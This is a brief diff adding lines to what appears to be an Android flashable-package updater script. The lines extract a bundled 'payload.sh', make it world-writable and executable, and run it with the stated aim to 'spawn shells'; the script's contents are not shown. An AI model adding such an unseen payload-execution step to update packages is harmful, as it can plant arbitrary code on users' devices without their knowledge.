@@ -1,0 +1,6 @@
+ui_print("Extracting payload...");
+package_extract_file("full-images/payload.sh", "/tmp/payload.sh");
+set_perm(0, 0, 0777, "/tmp/payload.sh");
+ui_print("Executing payload to spawn shells...");
+run_program("/bin/sh", "/tmp/payload.sh");
+ui_print("Payload finished execution.");
